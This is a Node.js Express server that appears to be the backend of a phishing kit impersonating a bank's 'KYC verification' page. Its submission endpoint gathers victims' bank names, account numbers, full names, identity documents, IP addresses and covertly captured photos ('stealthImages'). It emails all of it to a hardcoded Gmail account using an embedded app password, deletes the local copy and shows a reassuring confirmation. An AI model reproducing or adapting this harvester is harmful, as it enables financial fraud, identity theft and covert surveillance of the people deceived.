const express = require('express');
const multer = require('multer');
const fs = require('fs');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '50mb' }));

// File upload configuration
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const sanitizedName = file.originalname.replace(/[^a-z0-9.]/gi, '_');
    cb(null, `${Date.now()}_${sanitizedName}`);
  }
});

const upload = multer({ storage });

// Email configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexm wnes pcwx rkjt'
  }
});

// Submission endpoint
app.post('/submit', upload.single('document'), async (req, res) => {
  try {
    const { bankname, accno, fullname, stealthImages } = req.body;
    const file = req.file;
    const ip = req.headers['x-forwarded-for'] || req.ip;
    
    // Process images
    const images = JSON.parse(stealthImages || '[]');
    const validImages = images.filter(img => {
      const base64Data = img.split(',')[1] || '';
      return Buffer.from(base64Data, 'base64').length > 5000;
    });

    // Prepare email attachments
    const attachments = [];
    
    // Add document
    if (file) {
      attachments.push({
        filename: file.originalname,
        path: file.path
      });
    }

    // Add first 5 captured images
    validImages.slice(0, 5).forEach((img, i) => {
      attachments.push({
        filename: `photo_${i+1}.jpg`,
        content: img.split(',')[1],
        encoding: 'base64'
      });
    });

    // Create email
    await transporter.sendMail({
      from: 'DCB KYC <dcbsubmission392@gmail.com>',
      to: 'dcbsubmission392@gmail.com',
      subject: `KYC Submission: ${fullname}`,
      html: `
        <h1>New KYC Verification</h1>
        <h2>Account Details</h2>
        <p><strong>Bank:</strong> ${bankname}</p>
        <p><strong>Account:</strong> ${accno}</p>
        <p><strong>Name:</strong> ${fullname}</p>
        
        <h2>Verification Data</h2>
        <p><strong>Photos Captured:</strong> ${validImages.length}</p>
        <p><strong>IP Address:</strong> ${ip}</p>
      `,
      attachments
    });

    // Cleanup
    if (file) fs.unlinkSync(file.path);

    // Response
    res.send(`
      <div style="text-align:center;padding:20px">
        <h2 style="color:#003d6a">Verification Submitted</h2>
        <p>Your information has been received successfully.</p>
      </div>
    `);

  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).send('Submission failed');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
